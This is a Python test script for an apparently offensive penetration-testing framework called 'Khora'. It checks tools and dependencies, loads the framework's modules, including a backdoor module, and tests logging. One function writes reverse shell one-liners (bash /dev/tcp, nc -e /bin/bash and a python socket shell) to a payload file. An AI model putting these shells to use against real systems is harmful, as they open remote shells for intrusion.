#!/usr/bin/env python3
"""
Khora Validation & Testing Script
Tests all modules for basic functionality

Developed by: 2b53
Framework: Khora v2.1
"""

import sys
import os
import subprocess
import json
import datetime
from pathlib import Path
from importlib.util import spec_from_file_location, module_from_spec

from client import MODULE_INFO, MODULE_FILENAMES

MODULE_DIR = Path("modules")
MODULES_TO_TEST = list(MODULE_INFO.keys())

def test_environment():
    """Test system environment"""
    print("\n" + "="*70)
    print("ENVIRONMENT CHECK".center(70))
    print("="*70 + "\n")
    
    checks = {
        "Python 3.8+": (lambda: int(sys.version.split()[0].split('.')[1]) >= 8),
        "nmap installed": (lambda: subprocess.run(['nmap', '--version'], capture_output=True).returncode == 0),
        "nc/netcat installed": (lambda: subprocess.run(['nc', '-h'], capture_output=True).returncode in [0, 1]),
        "gcc installed": (lambda: subprocess.run(['gcc', '--version'], capture_output=True).returncode == 0),
        "Module directory exists": (lambda: MODULE_DIR.exists()),
        "Directories created": (lambda: all(Path(p).exists() for p in ['results', 'logs', 'exploits', 'payloads']))
    }
    
    results = {}
    for check_name, check_func in checks.items():
        try:
            result = check_func()
            status = "✓ PASS" if result else "✗ FAIL"
            results[check_name] = result
            print(f"[{status}] {check_name}")
        except Exception as e:
            results[check_name] = False
            print(f"[✗ FAIL] {check_name} - {str(e)[:50]}")
    
    return results

def test_module_loading():
    """Test module loading"""
    print("\n" + "="*70)
    print("MODULE LOADING TEST".center(70))
    print("="*70 + "\n")
    
    results = {}
    for module_name in MODULES_TO_TEST:
        try:
            module_file = MODULE_DIR / MODULE_FILENAMES.get(module_name, f"{module_name}_module.py")
            
            if not module_file.exists():
                print(f"[✗ FAIL] {module_name:15} - File not found: {module_file}")
                results[module_name] = False
                continue
            
            # Load module
            spec = spec_from_file_location(module_name, module_file)
            module = module_from_spec(spec)
            spec.loader.exec_module(module)
            
            # Check for run function
            if hasattr(module, 'run'):
                print(f"[✓ PASS] {module_name:15} - run() function found")
                results[module_name] = True
            else:
                print(f"[✗ FAIL] {module_name:15} - run() function missing")
                results[module_name] = False
                
        except Exception as e:
            print(f"[✗ FAIL] {module_name:15} - {str(e)[:50]}")
            results[module_name] = False
    
    return results

def test_dependencies():
    """Test Python dependencies"""
    print("\n" + "="*70)
    print("DEPENDENCY CHECK".center(70))
    print("="*70 + "\n")
    
    dependencies = {
        'scapy': 'Network packet manipulation',
        'requests': 'HTTP library',
        'Crypto': 'Cryptography library',
        'lxml': 'XML parsing',
        'cryptography': 'Encryption library',
    }
    
    results = {}
    for dep_name, description in dependencies.items():
        try:
            __import__(dep_name)
            print(f"[✓ PASS] {dep_name:20} - {description}")
            results[dep_name] = True
        except ImportError:
            print(f"[✗ FAIL] {dep_name:20} - {description}")
            results[dep_name] = False
    
    return results

def test_payload_generation():
    """Test basic payload generation"""
    print("\n" + "="*70)
    print("PAYLOAD GENERATION TEST".center(70))
    print("="*70 + "\n")
    
    try:
        # Load backdoor module
        spec = spec_from_file_location('backdoor', MODULE_DIR / 'backdoor_module.py')
        backdoor = module_from_spec(spec)
        spec.loader.exec_module(backdoor)
        
        # Test reverse shell generation
        print("[*] Testing reverse shell generation...")
        test_lhost = "192.168.1.1"
        test_lport = 4444
        
        # Create test payloads dict
        shells = {
            'bash': f'bash -i >& /dev/tcp/{test_lhost}/{test_lport} 0>&1',
            'nc': f'nc -e /bin/bash {test_lhost} {test_lport}',
            'python': 'python -c "import socket,subprocess,os;s=socket.socket();s.connect((...))"'
        }
        
        payloads_dir = Path("payloads")
        payloads_dir.mkdir(exist_ok=True)
        
        # Write test payloads
        with open(payloads_dir / "test_shells.txt", 'w') as f:
            for shell_type, payload in shells.items():
                f.write(f"[{shell_type}]\n{payload}\n\n")
        
        print("[✓ PASS] Reverse shell generation test")
        return True
        
    except Exception as e:
        print(f"[✗ FAIL] Payload generation - {e}")
        return False

def test_logging():
    """Test logging system"""
    print("\n" + "="*70)
    print("LOGGING SYSTEM TEST".center(70))
    print("="*70 + "\n")
    
    try:
        import logging
        from datetime import datetime
        
        log_dir = Path("logs")
        log_dir.mkdir(exist_ok=True)
        
        log_file = log_dir / f"test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        
        logger = logging.getLogger("TestLogger")
        handler = logging.FileHandler(log_file)
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
        
        logger.info("Test log entry")
        
        if log_file.exists() and log_file.stat().st_size > 0:
            print(f"[✓ PASS] Logging system - Created {log_file.name}")
            return True
        else:
            print("[✗ FAIL] Logging system - Empty log file")
            return False
            
    except Exception as e:
        print(f"[✗ FAIL] Logging system - {e}")
        return False

def generate_report(results_dict):
    """Generate test report"""
    print("\n" + "="*70)
    print("TEST SUMMARY".center(70))
    print("="*70 + "\n")
    
    total_tests = 0
    passed_tests = 0
    
    for category, results in results_dict.items():
        if isinstance(results, dict):
            category_pass = sum(1 for v in results.values() if v)
            category_total = len(results)
            total_tests += category_total
            passed_tests += category_pass
            
            percentage = (category_pass / category_total * 100) if category_total > 0 else 0
            status = "✓ PASS" if percentage >= 80 else "✗ FAIL"
            print(f"[{status}] {category}: {category_pass}/{category_total} ({percentage:.0f}%)")
    
    print("\n" + "-"*70)
    overall_percentage = (passed_tests / total_tests * 100) if total_tests > 0 else 0
    overall_status = "✓ ALL TESTS PASSED" if overall_percentage >= 80 else "✗ SOME TESTS FAILED"
    print(f"[{overall_status}] Overall: {passed_tests}/{total_tests} ({overall_percentage:.0f}%)")
    print("="*70 + "\n")
    
    # Save report - FIX: Replace colons with dashes in timestamp
    timestamp = datetime.datetime.now().strftime('%Y%m%d-%H%M%S')
    report_file = Path("results") / f"test_results_{timestamp}.json"
    
    try:
        with open(report_file, 'w') as f:
            json.dump({
                'total': total_tests,
                'passed': passed_tests,
                'percentage': overall_percentage,
                'details': results_dict
            }, f, indent=2, default=str)
        
        print(f"Report saved to: {report_file}\n")
    except Exception as e:
        print(f"[!] Failed to save report: {e}\n")
    
    return overall_percentage >= 80

def main():
    from datetime import datetime
    
    print("\n╔══════════════════════════════════════════════════════════╗")
    print("║   KHORA FRAMEWORK VALIDATION TEST SUITE                  ║")
    print("║   Comprehensive System & Module Check                    ║")
    print("╚══════════════════════════════════════════════════════════╝\n")
    print(f"Test Start: {datetime.now().isoformat()}\n")
    
    # Run all tests
    all_results = {
        'Environment': test_environment(),
        'Dependencies': test_dependencies(),
        'Module Loading': test_module_loading(),
        'Payload Generation': {'payload_test': test_payload_generation()},
        'Logging System': {'logging_test': test_logging()}
    }
    
    # Generate report
    success = generate_report(all_results)
    
    print(f"Test End: {datetime.now().isoformat()}\n")
    
    if success:
        print("✓ KHORA is ready for penetration testing!\n")
        print("Next steps:")
        print("  1. Review README.md for usage examples")
        print("  2. Run: python3 client.py --list")
        print("  3. Start assessment: python3 client.py <target> <lhost>\n")
        sys.exit(0)
    else:
        print("✗ Please fix failing tests and re-run this script\n")
        print("Troubleshooting:")
        print("  1. Install missing dependencies: pip install -r requirements.txt")
        print("  2. Install system tools: sudo apt install nmap gcc")
        print("  3. Check logs for details\n")
        sys.exit(1)

if __name__ == "__main__":
    main()
